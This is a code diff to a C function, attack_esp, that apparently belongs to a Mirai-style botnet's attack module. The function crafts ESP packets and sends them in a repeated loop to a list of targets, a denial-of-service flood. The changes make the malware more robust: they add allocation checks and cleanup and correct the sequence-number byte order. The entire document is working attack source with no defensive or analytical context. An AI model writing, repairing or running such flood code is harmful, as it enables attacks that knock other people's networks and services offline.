@@ -25,11 +25,12 @@ struct esp_header {
 
 void attack_esp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
+    int i, fd = -1;
+    char **pkts = NULL;
+    
     uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 128);
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff); 
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
 
     if (data_len > 1400) {
         data_len = 1400;
@@ -42,8 +43,12 @@ void attack_esp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
 #endif
         return;
     }
-    
-    
+
+    pkts = calloc(targs_len, sizeof(char *));
+    if (!pkts) {
+        close(fd);
+        return;
+    }
 
     for (i = 0; i < targs_len; i++)
     {
@@ -51,11 +56,14 @@ void attack_esp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
         char *payload;
         int packet_size = sizeof(struct esp_header) + data_len;
 
-        pkts[i] = calloc(packet_size, sizeof (char));
+        pkts[i] = calloc(packet_size, sizeof(char));
+        if (!pkts[i]) {
+            goto cleanup;
+        }
+        
         esph = (struct esp_header *)pkts[i];
         payload = (char *)(esph + 1);
 
-        
         if (dport == 0xffff)
             esph->spi = rand_next();
         else
@@ -70,19 +78,27 @@ void attack_esp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
     {
         for (i = 0; i < targs_len; i++)
         {
+            if (!pkts[i]) continue;
+            
             char *pkt = pkts[i];
             struct esp_header *esph = (struct esp_header *)pkt;
             int packet_size = sizeof(struct esp_header) + data_len;
 
-            esph->seq++;
+            esph->seq = htonl(ntohl(esph->seq) + 1);
             
-            
-            targs[i].sock_addr.sin_port = htons(dport); 
-            sendto(fd, pkt, packet_size, 0, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            targs[i].sock_addr.sin_port = htons(dport);
+            sendto(fd, pkt, packet_size, 0, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
 #ifdef DEBUG
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+        if (errno != 0)
+            printf("errno = %d\n", errno);
 #endif
     }
+
+cleanup:
+    for (i = 0; i < targs_len; i++) {
+        if (pkts[i]) free(pkts[i]);
+    }
+    free(pkts);
+    if (fd != -1) close(fd);
 }
